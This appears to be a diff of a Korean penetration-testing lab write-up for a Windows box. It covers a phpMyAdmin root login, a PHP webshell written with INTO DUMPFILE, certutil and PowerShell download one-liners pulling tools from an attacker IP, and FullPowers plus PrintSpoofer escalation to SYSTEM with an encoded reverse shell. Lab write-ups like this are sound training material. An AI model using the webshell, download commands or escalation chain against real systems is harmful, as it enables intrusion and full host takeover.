+`ImpersonateNamedPipeClient()`가 권한상승에 쓸 수 있는 수준의 임퍼소네이션을 하려면 `SeImpersonatePrivilege`가 필요하다. 특권이 없으면 무조건 실패가 아니라 Identify 수준으로 강등되어 클라이언트 신원 확인만 가능하고, 그 토큰으로는 프로세스를 만들 수 없다(MS 문서는 4개 조건 중 하나만 만족해도 임퍼소네이션을 허용한다 — 요청 수준이 Identification/Anonymous, 호출자가 SeImpersonate 보유, 명시적 자격증명으로 만든 토큰, 또는 인증된 신원이 호출자와 동일). 그래서 Potato 계열은 전부 "SeImpersonate 보유"를 전제로 한다. 특권 없이 PrintSpoofer를 던지면 아무 일도 안 일어난다. 이 박스가 노리는 지점이 정확히 여기다 — 처음에 셸을 잡으면 특권이 3개뿐이라 PrintSpoofer가 안 먹는다.
 
 **Potato 계열 비교** — ②단계(누구를 어떻게 속이는가)만 다르다:
 
 | 이름 | ② 유인 방법 | 동작 조건 | Server 2019(build 17763) |
 |---|---|---|---|
 | Hot Potato | NBNS 스푸핑 + WPAD + NTLM 릴레이 | 구버전 Windows | ❌ |
-| RottenPotato / **JuicyPotato** | DCOM으로 SYSTEM 서비스가 우리 COM 리스너에 인증 | OXID 리졸버를 임의 로컬 포트로 유도 가능해야 함 | ❌ **죽었다** (1809부터 OXID를 135 외 포트로 질의 불가) |
-| **RoguePotato** | OXID 리졸버를 **외부 135 릴레이**로 우회 | **아웃바운드 135 필요** | ✅ |
-| **PrintSpoofer** | **Print Spooler** RPC(`RpcRemoteFindFirstPrinterChangeNotificationEx`)로 spoolsv.exe(SYSTEM)를 **우리 명명 파이프에 접속**시킴 | **Spooler 서비스 실행 중** | ✅ ← **이 박스** |
-| EfsPotato / SharpEfsPotato | **EFSRPC**(`lsarpc` 파이프) 유인 | Spooler 꺼져 있어도 됨 | ✅ |
+| RottenPotato / JuicyPotato | DCOM으로 SYSTEM 서비스가 우리 COM 리스너에 인증 | OXID 리졸버를 임의 로컬 포트로 유도 가능해야 함 | ❌ 죽었다 (1809부터 OXID를 135 외 포트로 질의 불가) |
+| RoguePotato | OXID 리졸버를 외부 135 릴레이로 우회 | 아웃바운드 135 필요 | ✅ |
+| **PrintSpoofer** | Print Spooler RPC(`RpcRemoteFindFirstPrinterChangeNotificationEx`)로 spoolsv.exe(SYSTEM)를 우리 명명 파이프에 접속시킴 | Spooler 서비스 실행 중 | ✅ ← **이 박스** |
+| EfsPotato / SharpEfsPotato | EFSRPC(`lsarpc` 파이프) 유인 | Spooler 꺼져 있어도 됨 | ✅ |
 | GodPotato | DCOM/RPC 범용 변형 | 광범위 | ✅ |
 
-> [!tip] Windows 셸을 잡았을 때의 판단 순서
-> ```
-> whoami /priv
->   └─ SeImpersonate 있음 ──→ PrintSpoofer 시도
->   │                          └─ 실패(Spooler 꺼짐) ──→ EfsPotato / GodPotato
->   │                                                  └─ 실패 ──→ RoguePotato (아웃바운드 135 필요)
->   └─ SeImpersonate 없음 ──→ 계정이 LOCAL/NETWORK SERVICE 인가?
->                              └─ 예 ──→ **FullPowers로 복원 시도** ← 이 박스
->                              └─ 아니오 ──→ 다른 경로(서비스 오설정·AlwaysInstallElevated·언쿼티드 경로…)
-> ```
+Windows 셸을 잡았을 때의 판단 순서:
+
+```
+whoami /priv
+  └─ SeImpersonate 있음 ──→ PrintSpoofer 시도
+  │                          └─ 실패(Spooler 꺼짐) ──→ EfsPotato / GodPotato
+  │                                                  └─ 실패 ──→ RoguePotato (아웃바운드 135 필요)
+  └─ SeImpersonate 없음 ──→ 계정이 LOCAL/NETWORK SERVICE 인가?
+                             └─ 예 ──→ **FullPowers로 복원 시도** ← 이 박스
+                             └─ 아니오 ──→ 다른 경로(서비스 오설정·AlwaysInstallElevated·언쿼티드 경로…)
+```
 
 ### 2-8. 왜 `LOCAL SERVICE`의 특권이 "박탈"돼 있는가 — 이 박스의 설계 의도
 
-`LOCAL SERVICE` 계정 자체는 **기본적으로 `SeImpersonatePrivilege`를 보유**한다. 그런데 우리 웹셸의 `whoami /priv`에는 3개밖에 없었다.
+`LOCAL SERVICE` 계정 자체는 기본적으로 `SeImpersonatePrivilege`를 보유한다. 그런데 우리 웹셸의 `whoami /priv`에는 3개밖에 없었다.
 
-원인은 **Windows Vista 이후의 "서비스 최소 특권(least-privilege services)" 모델**이다:
+원인은 Windows Vista 이후의 "서비스 최소 특권(least-privilege services)" 모델이다. 서비스 제어 관리자(SCM)는 서비스를 기동할 때, 서비스가 레지스트리의 `RequiredPrivileges` 값으로 선언한 특권 외에는 토큰에서 제거한 채 프로세스를 만든다. 즉 계정의 특권 ≠ 프로세스 토큰의 특권이다. WampServer의 Apache 서비스는 필요한 것만 선언했고, 그 자식으로 태어난 우리 웹셸은 깎인 토큰을 그대로 상속받았다.
 
-> 서비스 제어 관리자(SCM)는 서비스를 기동할 때, 서비스가 레지스트리의 **`RequiredPrivileges`** 값으로 선언한 특권 **외에는 토큰에서 제거**한 채 프로세스를 만든다.
-
-즉 **계정의 특권 ≠ 프로세스 토큰의 특권**이다. WampServer의 Apache 서비스는 필요한 것만 선언했고, 그 자식으로 태어난 우리 웹셸은 **깎인 토큰을 그대로 상속**받았다.
-
-**FullPowers의 원리** — SCM을 우회해서 같은 계정의 **온전한 기본 토큰**을 새로 얻는다:
+FullPowers의 원리 — SCM을 우회해서 같은 계정의 온전한 기본 토큰을 새로 얻는다:
 
 ```
 ① 작업 스케줄러(내부적으로 Task Scheduler 2.0 COM API `ITaskService`)로 "NT AUTHORITY\LOCAL SERVICE" 예약 작업을 등록한다
@@ -609,16 +557,13 @@ CreateProcessAsUser(hToken, ...)               // SYSTEM으로 프로세스 생�
 ④ 예약 작업은 즉시 삭제한다
 ```
 
-> [!danger] 이걸 모르면 이 박스는 여기서 끝난다
-> `whoami /priv`에 `SeImpersonatePrivilege`가 없으면 대부분 "Potato 경로는 없다"고 판단하고 다른 곳을 뒤진다. **그게 함정이다.**
-> **판정 기준**: `whoami`가 `nt authority\local service` 또는 `nt authority\network service` 인가? → 그렇다면 특권은 **없는 게 아니라 깎인 것**일 수 있다. FullPowers를 먼저 시도한다.
-> ([[Hub]]·[[Hawat]]의 "서비스가 어떤 계정으로 도는가"를 확인하는 습관의 Windows 판이다.)
+`whoami /priv`에 `SeImpersonatePrivilege`가 없으면 대부분 "Potato 경로는 없다"고 판단하고 다른 곳을 뒤진다 — 그게 함정이다. 판정 기준은 `whoami`가 `nt authority\local service` 또는 `nt authority\network service`인가다. 그렇다면 특권은 없는 게 아니라 깎인 것일 수 있으니 FullPowers를 먼저 시도한다([[Hub]]·[[Hawat]]의 "서비스가 어떤 계정으로 도는가"를 확인하는 습관의 Windows 판이다).
 
 ---
 
 ## 3. Foothold — phpMyAdmin `root` 무비번 → `INTO DUMPFILE` 웹셸
 
-프록시 경유라서 브라우저 대신 스크립트로 몬다. `requests.Session`에 프록시를 물리되 **`trust_env=False`**가 중요하다(환경변수 프록시 설정이 끼어드는 것을 막는다).
+프록시 경유라서 브라우저 대신 스크립트로 몬다. `requests.Session`에 프록시를 물리되 `trust_env=False`가 중요하다(환경변수 프록시 설정이 끼어드는 것을 막는다).
 
 ```python
 # ~/PG/Squid/pma.py 핵심
@@ -630,11 +575,9 @@ s.proxies = {'http': 'http://192.168.248.189:3128'}
 # 3) 응답의 새 token 으로 import.php 에 POST: sql_query=...
 ```
 
-phpMyAdmin은 요청마다 **토큰이 갱신**된다. 로그인 응답에서 새 토큰을 다시 뽑아야 SQL이 실행된다.
+phpMyAdmin은 요청마다 토큰이 갱신된다. 로그인 응답에서 새 토큰을 다시 뽑아야 SQL이 실행된다.
 
-> [!warning] `trust_env = False`를 빼면 조용히 엉뚱한 곳으로 나간다
-> `requests`는 기본적으로 `http_proxy`·`HTTPS_PROXY`·`no_proxy` 환경변수와 `.netrc`를 읽는다. 칼리에 Burp 프록시 설정 같은 게 남아 있으면 **우리가 지정한 프록시가 덮어써지거나 무시**된다.
-> 증상이 "연결은 되는데 응답이 이상하다"로 나타나 원인 찾기가 오래 걸린다. **프록시를 코드로 명시할 때는 항상 `trust_env=False`를 같이 쓴다.**
+`trust_env = False`를 빼면 조용히 엉뚱한 곳으로 나간다. `requests`는 기본적으로 `http_proxy`·`HTTPS_PROXY`·`no_proxy` 환경변수와 `.netrc`를 읽는다. 칼리에 Burp 프록시 설정 같은 게 남아 있으면 우리가 지정한 프록시가 덮어써지거나 무시된다. 증상이 "연결은 되는데 응답이 이상하다"로 나타나 원인 찾기가 오래 걸린다. 프록시를 코드로 명시할 때는 항상 `trust_env=False`를 같이 쓴다.
 
 첫 정찰 쿼리:
 
@@ -649,11 +592,9 @@ C:\wamp\bin\mysql\mysql5.7.31\data\
 C:\wamp\bin\mysql\mysql5.7.31\
 ```
 
-> [!danger] `@@secure_file_priv`가 빈 문자열 = 파일 쓰기 무제한
-> 이 변수가 특정 디렉터리로 설정돼 있으면 `INTO OUTFILE`/`INTO DUMPFILE`은 그 안에만 쓸 수 있다. **`NULL`이면 완전 차단, 빈 문자열이면 아무 데나 쓸 수 있다.**
-> MySQL로 파일 쓰기를 시도하기 전에 **반드시 이 값부터 확인**한다. 확인 안 하고 페이로드를 던지면 왜 실패하는지 모른 채 시간을 태운다.
+`@@secure_file_priv`가 빈 문자열이면 파일 쓰기 무제한이다. 이 변수가 특정 디렉터리로 설정돼 있으면 `INTO OUTFILE`/`INTO DUMPFILE`은 그 안에만 쓸 수 있고, `NULL`이면 완전 차단, 빈 문자열이면 아무 데나 쓸 수 있다. MySQL로 파일 쓰기를 시도하기 전에 반드시 이 값부터 확인한다. 확인 안 하고 페이로드를 던지면 왜 실패하는지 모른 채 시간을 태운다.
 
-웹셸을 심는다. **따옴표가 여러 계층(HTTP → PHP → SQL)을 지나며 깨지는 것을 피하려고 hex 리터럴**을 썼다:
+웹셸을 심는다. 따옴표가 여러 계층(HTTP → PHP → SQL)을 지나며 깨지는 것을 피하려고 hex 리터럴을 썼다:
 
 ```php
 <?php echo "PWN:"; if(isset($_REQUEST['c'])){ echo shell_exec($_REQUEST['c']); } ?>
@@ -667,14 +608,9 @@ INTO DUMPFILE 'C:/wamp/www/sh.php';
 [success] MySQL returned an empty result set (Query took 0.0008 seconds.)
 ```
 
-> [!tip] `INTO OUTFILE` 대신 `INTO DUMPFILE`
-> `OUTFILE`은 행/열 구분자를 삽입해 **바이너리나 정확한 바이트열이 깨진다.** `DUMPFILE`은 단일 행을 **가공 없이 그대로** 쓴다. 웹셸·실행파일을 심을 때는 `DUMPFILE`이 맞다.
-> 경로 구분자는 `C:/wamp/www/`처럼 **슬래시**를 쓴다(백슬래시는 SQL 이스케이프와 충돌).
+`OUTFILE`은 행/열 구분자를 삽입해 바이너리나 정확한 바이트열이 깨진다. `DUMPFILE`은 단일 행을 가공 없이 그대로 쓴다. 웹셸·실행파일을 심을 때는 `DUMPFILE`이 맞다. 경로 구분자는 `C:/wamp/www/`처럼 슬래시를 쓴다(백슬래시는 SQL 이스케이프와 충돌).
 
-> [!note] 웹셸에 `echo "PWN:"`을 붙인 이유
-> 응답에 고정 마커가 있으면 **"웹셸이 실행됐는데 명령 출력이 비었다"** 와 **"웹셸 자체가 없다(404/500)"** 를 즉시 구분할 수 있다.
-> 마커 없이 빈 응답만 보면 원인을 특정 못 해 시간을 태운다. **웹셸에는 항상 고정 마커를 넣어라.**
-> `$_REQUEST`를 쓴 것도 의도적이다 — GET·POST 어느 쪽으로든 받는다.
+웹셸에 `echo "PWN:"`을 붙인 이유는, 응답에 고정 마커가 있으면 "웹셸이 실행됐는데 명령 출력이 비었다"와 "웹셸 자체가 없다(404/500)"를 즉시 구분할 수 있기 때문이다. 마커 없이 빈 응답만 보면 원인을 특정 못 해 시간을 태운다. 웹셸에는 항상 고정 마커를 넣어라. `$_REQUEST`를 쓴 것도 의도적이다 — GET·POST 어느 쪽으로든 받는다.
 
 ```bash
 ┌──(kali㉿kali)-[~/PG/Squid]
@@ -691,19 +627,14 @@ PWN:nt authority\local service
 
 | 플래그 | 역할 | 빼면 |
 |---|---|---|
-| `--get` | `--data-urlencode`로 만든 데이터를 **쿼리스트링으로** 붙인다 | POST가 되어버린다. `$_REQUEST`라 동작은 하지만 URL에 안 남아 디버깅이 불편 |
-| `--data-urlencode "c=$*"` | 명령 문자열을 **curl이 인코딩**한다 | 공백·`&`·`\`·`|`가 들어가면 반드시 깨진다. **Windows 경로의 백슬래시 때문에 필수** |
+| `--get` | `--data-urlencode`로 만든 데이터를 쿼리스트링으로 붙인다 | POST가 되어버린다. `$_REQUEST`라 동작은 하지만 URL에 안 남아 디버깅이 불편 |
+| `--data-urlencode "c=$*"` | 명령 문자열을 curl이 인코딩한다 | 공백·`&`·`\`·`|`가 들어가면 반드시 깨진다. Windows 경로의 백슬래시 때문에 필수 |
 | `-m 60` | 60초 타임아웃 | 프록시 왕복 + Windows 명령 실행이라 느리다. 짧으면 정상 명령이 끊긴다 |
 | `"$*"` (스크립트) | 인자 전체를 한 문자열로 | `"$@"`를 쓰면 인자별로 쪼개져 `c=`에 첫 단어만 들어간다 |
 
-> [!warning] 이 웹셸은 **상태가 없다** — Windows에서 특히 중요
-> 매 요청이 새 `cmd.exe`다. `cd C:\Users` 다음에 `dir`를 쳐도 원래 디렉터리다.
-> 리눅스라면 여기서 리버스셸을 올려 TTY 업그레이드(`python3 -c 'import pty; pty.spawn("/bin/bash")'`)를 하지만, **Windows에는 TTY 개념이 없어 그 단계 자체가 존재하지 않는다.**
-> 대신 Windows에서는 **항상 절대경로로 명령을 조립**하고, 필요하면 `cmd /c "A && B"`로 한 요청에 묶는다.
+이 웹셸은 상태가 없다 — Windows에서 특히 중요하다. 매 요청이 새 `cmd.exe`다. `cd C:\Users` 다음에 `dir`를 쳐도 원래 디렉터리다. 리눅스라면 여기서 리버스셸을 올려 TTY 업그레이드(`python3 -c 'import pty; pty.spawn("/bin/bash")'`)를 하지만, Windows에는 TTY 개념이 없어 그 단계 자체가 존재하지 않는다. 대신 Windows에서는 항상 절대경로로 명령을 조립하고, 필요하면 `cmd /c "A && B"`로 한 요청에 묶는다.
 
-> [!tip] 자동 도구를 안 썼다 — 시험 관점에서 유리한 지점
-> 이 구간에서 sqlmap·metasploit을 전혀 쓰지 않았다. **자격증명을 알고 있으므로 인젝션이 아니라 정상 로그인**이고, 파일 쓰기는 SQL 한 줄이다.
-> 시험에서도 동일하다 — **DB 자격증명을 손에 넣었으면 sqlmap은 필요 없다.** 웹 SQL 클라이언트(phpMyAdmin/adminer)나 `mysql` 클라이언트로 직접 친다.
+이 구간에서 sqlmap·metasploit을 전혀 쓰지 않았다. 자격증명을 알고 있으므로 인젝션이 아니라 정상 로그인이고, 파일 쓰기는 SQL 한 줄이다. 시험에서도 동일하다 — DB 자격증명을 손에 넣었으면 sqlmap은 필요 없다. 웹 SQL 클라이언트(phpMyAdmin/adminer)나 `mysql` 클라이언트로 직접 친다.
 
 ---
 
@@ -735,11 +666,9 @@ SeCreateGlobalPrivilege       Create global objects          Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
 ```
 
-**3개뿐이다.** PrintSpoofer가 요구하는 `SeImpersonatePrivilege`가 없다.
+3개뿐이다. PrintSpoofer가 요구하는 `SeImpersonatePrivilege`가 없다.
 
-> [!note] 이 3개는 왜 남았는가
-> 전부 **무해한 기본 특권**이다. `SeChangeNotify`(디렉터리 순회 검사 생략)는 사실상 모든 프로세스가 갖고, `SeCreateGlobal`은 전역 네임스페이스 객체 생성용이다.
-> **"특권이 3개 있다"가 아니라 "관리자급 특권이 0개다"** 로 읽어야 한다. 개수가 아니라 **목록에 위험 특권이 있는지**를 본다.
+이 3개는 전부 무해한 기본 특권이라 남았다. `SeChangeNotify`(디렉터리 순회 검사 생략)는 사실상 모든 프로세스가 갖고, `SeCreateGlobal`은 전역 네임스페이스 객체 생성용이다. "특권이 3개 있다"가 아니라 "관리자급 특권이 0개다"로 읽어야 한다. 개수가 아니라 목록에 위험 특권이 있는지를 본다.
 
 ### 4-2. 도구 전송 — Windows 파일 다운로드
 
@@ -750,30 +679,30 @@ CertUtil: -URLCache command completed successfully.
 
 | 플래그 | 의미 |
 |---|---|
-| `-urlcache` | URL 캐시 조작 기능. **부수 효과로 파일을 받는다** (원래 다운로더가 아니다) |
-| `-f` | 강제. **캐시를 무시하고 새로 받는다.** 빼면 이전 캐시가 반환되어 옛 파일이 남는다 |
+| `-urlcache` | URL 캐시 조작 기능. 부수 효과로 파일을 받는다 (원래 다운로더가 아니다) |
+| `-f` | 강제. 캐시를 무시하고 새로 받는다. 빼면 이전 캐시가 반환되어 옛 파일이 남는다 |
 
 칼리 쪽:
 ```bash
 python3 -m http.server 8000
 ```
 
-> [!tip] Windows 다운로드 3종 — 하나가 막히면 다음
-> ```cmd
-> certutil -urlcache -f http://IP:8000/f.exe f.exe
-> powershell -c "iwr http://IP:8000/f.exe -OutFile f.exe"
-> powershell -c "(New-Object Net.WebClient).DownloadFile('http://IP:8000/f.exe','f.exe')"
-> bitsadmin /transfer j http://IP:8000/f.exe C:\Users\Public\f.exe
-> ```
-> **쓰기 가능한 디렉터리**: `C:\Users\Public\`, `C:\Windows\Temp\`, `%TEMP%`. `C:\`나 `C:\Windows\`는 대개 안 된다.
+Windows 다운로드 3종 — 하나가 막히면 다음:
+```cmd
+certutil -urlcache -f http://IP:8000/f.exe f.exe
+powershell -c "iwr http://IP:8000/f.exe -OutFile f.exe"
+powershell -c "(New-Object Net.WebClient).DownloadFile('http://IP:8000/f.exe','f.exe')"
+bitsadmin /transfer j http://IP:8000/f.exe C:\Users\Public\f.exe
+```
+쓰기 가능한 디렉터리: `C:\Users\Public\`, `C:\Windows\Temp\`, `%TEMP%`. `C:\`나 `C:\Windows\`는 대개 안 된다.
 
-**이 단계에서 실제로 막혔다 — 6장 ①을 먼저 읽어라.** 상대 파일명으로 받으면 certutil이 "성공"을 반환하고도 파일이 사라진다. **쓰기 가능한 절대경로**(`C:\Users\Public\ps.exe`)를 줘야 통과했다.
+이 단계에서 실제로 막혔다 — 6장 ①을 먼저 읽어라. 상대 파일명으로 받으면 certutil이 "성공"을 반환하고도 파일이 사라진다. **쓰기 가능한 절대경로**(`C:\Users\Public\ps.exe`)를 줘야 통과했다.
 
 ### 4-3. 1단계 — FullPowers로 특권 복원
 
-`LOCAL SERVICE`는 원래 `SeImpersonatePrivilege`를 가지고 있지만, **서비스로 실행되지 않은 프로세스에서는 토큰의 특권이 제거된 상태**로 시작한다. (원리는 2-8 참조)
+`LOCAL SERVICE`는 원래 `SeImpersonatePrivilege`를 가지고 있지만, 서비스로 실행되지 않은 프로세스에서는 토큰의 특권이 제거된 상태로 시작한다(원리는 2-8 참조).
 
-[FullPowers](https://github.com/itm4n/FullPowers)는 **예약 작업(scheduled task)으로 자기 자신을 재기동**해서 완전한 서비스 토큰을 되찾는다:
+[FullPowers](https://github.com/itm4n/FullPowers)는 예약 작업(scheduled task)으로 자기 자신을 재기동해서 완전한 서비스 토큰을 되찾는다:
 
 ```
 C:\Users\Public\fp.exe -c "cmd /c whoami /priv > C:\Users\Public\priv_after.txt 2>&1" -z
@@ -795,34 +724,35 @@ SeCreateGlobalPrivilege       Create global objects                     Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled
 ```
 
-**3개 → 7개.** `SeImpersonatePrivilege` 복원 확인.
+3개 → 7개. `SeImpersonatePrivilege` 복원 확인.
 
-> [!note] 출력 네 줄을 원리와 짝지어 읽어라
-> | 출력 | 대응하는 동작 |
-> |---|---|
-> | `Started dummy thread` | 토큰을 붙일 대상 스레드 준비 |
-> | `Successfully created scheduled task` | **SCM이 아닌 작업 스케줄러**로 LOCAL SERVICE 프로세스 기동 (2-8 ①②) |
-> | `Got new token! Privilege count: 7` | 그 프로세스의 온전한 토큰 복제 성공 |
-> | `CreateProcessAsUser() OK` | 복제 토큰으로 새 프로세스 생성 (2-8 ③) |
->
-> `CreateProcessAsUser()`는 **`SeIncreaseQuotaPrivilege`가 필수**이고, **`SeAssignPrimaryTokenPrivilege`는 토큰이 assignable하지 않을 때**만 필요하다(호출자 프라이머리 토큰의 제한 버전이면 불필요). 복원된 7개 목록에 **그 둘이 다 들어 있어** 조건과 무관하게 성공한다 — 원리와 관측이 맞물린다.
+출력 네 줄을 원리와 짝지어 읽는다:
+
+| 출력 | 대응하는 동작 |
+|---|---|
+| `Started dummy thread` | 토큰을 붙일 대상 스레드 준비 |
+| `Successfully created scheduled task` | SCM이 아닌 작업 스케줄러로 LOCAL SERVICE 프로세스 기동 (2-8 ①②) |
+| `Got new token! Privilege count: 7` | 그 프로세스의 온전한 토큰 복제 성공 |
+| `CreateProcessAsUser() OK` | 복제 토큰으로 새 프로세스 생성 (2-8 ③) |
+
+`CreateProcessAsUser()`는 `SeIncreaseQuotaPrivilege`가 필수이고, `SeAssignPrimaryTokenPrivilege`는 토큰이 assignable하지 않을 때만 필요하다(호출자 프라이머리 토큰의 제한 버전이면 불필요). 복원된 7개 목록에 그 둘이 다 들어 있어 조건과 무관하게 성공한다 — 원리와 관측이 맞물린다.
 
 **플래그 해설**
 
 | 플래그 | 의미 |
 |---|---|
 | `-c "<명령>"` | 복원된 토큰으로 실행할 명령 |
-| `> ... 2>&1` | 표준출력·표준에러를 **파일로** 받는다. 새 프로세스는 우리 웹셸과 콘솔이 분리돼 **출력이 화면에 안 온다.** 파일로 받아 따로 읽어야 한다 |
-| `-z` | **[가정]** 원문 출력의 `Started dummy thread`와 짝을 이루는 동작 제어 옵션으로 보인다. 의미를 확신할 수 없으므로 **원문 그대로 재현**했다. 도구 옵션은 모르면 추측해 바꾸지 말고 동작한 조합을 그대로 쓴다 |
-| `-x` | (참고) FullPowers의 **확장 특권 세트** 옵션. 기본 복원 세트로 부족할 때 더 넓은 특권을 요청한다. 이 박스에서는 기본 세트에 `SeImpersonate`가 포함돼 불필요했다 |
+| `> ... 2>&1` | 표준출력·표준에러를 파일로 받는다. 새 프로세스는 우리 웹셸과 콘솔이 분리돼 출력이 화면에 안 온다. 파일로 받아 따로 읽어야 한다 |
+| `-z` | **[가정]** 원문 출력의 `Started dummy thread`와 짝을 이루는 동작 제어 옵션으로 보인다. 의미를 확신할 수 없으므로 원문 그대로 재현했다. 도구 옵션은 모르면 추측해 바꾸지 말고 동작한 조합을 그대로 쓴다 |
+| `-x` | (참고) FullPowers의 확장 특권 세트 옵션. 기본 복원 세트로 부족할 때 더 넓은 특권을 요청한다. 이 박스에서는 기본 세트에 `SeImpersonate`가 포함돼 불필요했다 |
 
 > [!warning] `whoami /priv`에 SeImpersonate가 없다고 포기하지 마라
-> `LOCAL SERVICE`·`NETWORK SERVICE` 컨텍스트라면 **특권이 "없는" 게 아니라 "박탈된" 것**일 수 있다. FullPowers로 되찾을 수 있는지 먼저 확인한다.
+> `LOCAL SERVICE`·`NETWORK SERVICE` 컨텍스트라면 특권이 없는 게 아니라 박탈된 것일 수 있다. FullPowers로 되찾을 수 있는지 먼저 확인한다.
 > 이 박스의 설계 의도가 정확히 이 지점이다 — PrintSpoofer만 알고 FullPowers를 모르면 막힌다.
 
 ### 4-4. 2단계 — PrintSpoofer로 SYSTEM
 
-PrintSpoofer는 **FullPowers가 만든 토큰 안에서** 실행돼야 한다. 중첩 인용을 피하려고 배치 파일로 감쌌다:
+PrintSpoofer는 FullPowers가 만든 토큰 안에서 실행돼야 한다. 중첩 인용을 피하려고 배치 파일로 감쌌다:
 
 ```bat
 REM C:\Users\Public\go.bat
@@ -843,10 +773,9 @@ nt authority\system
 SQUID
 ```
 
-SYSTEM 토큰은 특권 **약 30개를 보유하며 일부는 Disabled 상태**다. Enabled인 위험 특권으로는 `SeDebugPrivilege`·`SeTcbPrivilege`·`SeImpersonatePrivilege`가 있고, `SeTakeOwnership`·`SeRestore`·`SeBackup` 등은 기본 **Disabled**(필요 시 `AdjustTokenPrivileges`로 활성화).
+SYSTEM 토큰은 특권 약 30개를 보유하며 일부는 Disabled 상태다. Enabled인 위험 특권으로는 `SeDebugPrivilege`·`SeTcbPrivilege`·`SeImpersonatePrivilege`가 있고, `SeTakeOwnership`·`SeRestore`·`SeBackup` 등은 기본 Disabled(필요 시 `AdjustTokenPrivileges`로 활성화).
 
-> [!note] **Enabled와 Present는 다르다**
-> 토큰에 특권이 **존재(present)**하는 것과 **켜져(enabled)** 있는 것은 별개다. Disabled여도 프로세스가 스스로 `AdjustTokenPrivileges`로 켤 수 있으므로 권한상승 도구는 필요한 특권을 실행 시 enable한다. `whoami /priv`의 State 열을 개수로 세지 말고 **목록에 위험 특권이 있는지**로 읽어야 하는 이유다.
+Enabled와 Present는 다르다. 토큰에 특권이 존재(present)하는 것과 켜져(enabled) 있는 것은 별개다. Disabled여도 프로세스가 스스로 `AdjustTokenPrivileges`로 켤 수 있으므로 권한상승 도구는 필요한 특권을 실행 시 enable한다. `whoami /priv`의 State 열을 개수로 세지 말고 목록에 위험 특권이 있는지로 읽어야 하는 이유다.
 
 **플래그 해설 — `powershell -enc`**
 
@@ -854,32 +783,28 @@ SYSTEM 토큰은 특권 **약 30개를 보유하며 일부는 Disabled 상태**�
 |---|---|
 | `-nop` | `-NoProfile`. 프로필 스크립트 로딩 생략 → 빠르고, 프로필 오류로 죽지 않는다 |
 | `-w hidden` | `-WindowStyle Hidden`. 창을 띄우지 않는다 |
-| `-enc` | **UTF-16LE로 인코딩한 문자열의 base64**를 받는다 |
+| `-enc` | UTF-16LE로 인코딩한 문자열의 base64를 받는다 |
 
-> [!danger] `-enc`의 base64는 **UTF-16LE**다 — 리눅스 습관대로 하면 반드시 실패한다
-> ```bash
-> # 틀림 (UTF-8)
-> echo -n '<명령>' | base64 -w0
-> # 맞음 (UTF-16LE)
-> echo -n '<명령>' | iconv -t UTF-16LE | base64 -w0
-> ```
-> `-enc`를 쓰는 이유는 **인용 지옥 회피**다. 리버스셸 원문에는 `$`·`"`·`(`·`)`·`;`가 가득한데, `cmd /c` → `.bat` → `PrintSpoofer -c` → `powershell`로 4중 중첩되면 반드시 깨진다.
-> base64는 `[A-Za-z0-9+/=]`뿐이라 **모든 계층을 무사통과**한다. 2-5의 hex 리터럴과 **완전히 같은 발상**이다.
+`-enc`의 base64는 **UTF-16LE**다 — 리눅스 습관대로 하면 반드시 실패한다:
+```bash
+# 틀림 (UTF-8)
+echo -n '<명령>' | base64 -w0
+# 맞음 (UTF-16LE)
+echo -n '<명령>' | iconv -t UTF-16LE | base64 -w0
+```
+`-enc`를 쓰는 이유는 인용 지옥 회피다. 리버스셸 원문에는 `$`·`"`·`(`·`)`·`;`가 가득한데, `cmd /c` → `.bat` → `PrintSpoofer -c` → `powershell`로 4중 중첩되면 반드시 깨진다. base64는 `[A-Za-z0-9+/=]`뿐이라 모든 계층을 무사통과한다. 2-5의 hex 리터럴과 완전히 같은 발상이다.
 
-> [!tip] 왜 `.bat`으로 한 번 더 감쌌는가
-> `fp.exe -c "cmd /c ps.exe -c \"powershell -enc ...\""` 처럼 쓰면 **따옴표 안의 따옴표**가 되어 `cmd.exe` 파서가 잘라먹는다.
-> Windows에는 리눅스의 `'...'` 같은 강한 인용이 없다. **중첩이 2단을 넘으면 배치 파일로 빼는 것이 가장 확실하다.**
-> 시험장에서 시간을 태우는 대표적 원인이 이 인용 중첩이다 — **막히면 즉시 파일로 뺀다.**
+`.bat`으로 한 번 더 감싼 이유는, `fp.exe -c "cmd /c ps.exe -c \"powershell -enc ...\""`처럼 쓰면 따옴표 안의 따옴표가 되어 `cmd.exe` 파서가 잘라먹기 때문이다. Windows에는 리눅스의 `'...'` 같은 강한 인용이 없다. 중첩이 2단을 넘으면 배치 파일로 빼는 것이 가장 확실하다. 시험장에서 시간을 태우는 대표적 원인이 이 인용 중첩이다 — 막히면 즉시 파일로 뺀다.
 
 **대안 경로 비교** (전부 시도하지는 않았다 — [가정] 표시)
 
 | 경로 | 가능 여부 | 근거 |
 |---|---|---|
-| **PrintSpoofer** | ✅ 실측 성공 | Spooler 실행 중, build 17763 |
+| PrintSpoofer | ✅ 실측 성공 | Spooler 실행 중, build 17763 |
 | JuicyPotato | ❌ | build 17763에서 무력화 |
 | RoguePotato | [가정] 가능하나 불리 | 아웃바운드 135 릴레이가 필요하고, 이 박스는 아웃바운드 4444가 열려 있음이 확인됐을 뿐 135는 미확인 |
 | EfsPotato/GodPotato | [가정] 가능 | 조건이 더 느슨하다. PrintSpoofer가 실패했다면 다음 후보 |
-| **5985 WinRM으로 관리자 접속** | ❌ | 포트는 열려 있지만 **Administrator 자격증명이 없다.** 게다가 Squid가 `CONNECT`를 막아 evil-winrm을 프록시로 통과시킬 수 없다 |
+| 5985 WinRM으로 관리자 접속 | ❌ | 포트는 열려 있지만 Administrator 자격증명이 없다. 게다가 Squid가 `CONNECT`를 막아 evil-winrm을 프록시로 통과시킬 수 없다 |
 | SYSTEM 획득 후 SAM 덤프 → PtH | [가정] 가능 | 외부 445가 열려 있으므로 해시를 뽑았다면 `psexec`/`evil-winrm`으로 직접 붙을 수 있다. 여기서는 불필요했다 |
 
 ---
@@ -898,17 +823,13 @@ PROOF=45f64bc8483c77cf487fad00f8cb0120
 | `local.txt` | **`C:\local.txt`** ← 비표준 위치 | `02ef1765e826b864a4b6cb74e532398c` |
 | `proof.txt` | `C:\Users\Administrator\Desktop\` | `45f64bc8483c77cf487fad00f8cb0120` |
 
-> [!danger] `local.txt`가 `C:\` 루트에 있다
-> `C:\Users\`에는 `Administrator`와 `Public`뿐이고 **일반 유저 계정이 없다.** `C:\Users\*\Desktop\local.txt` 패턴으로 찾으면 영원히 못 찾는다.
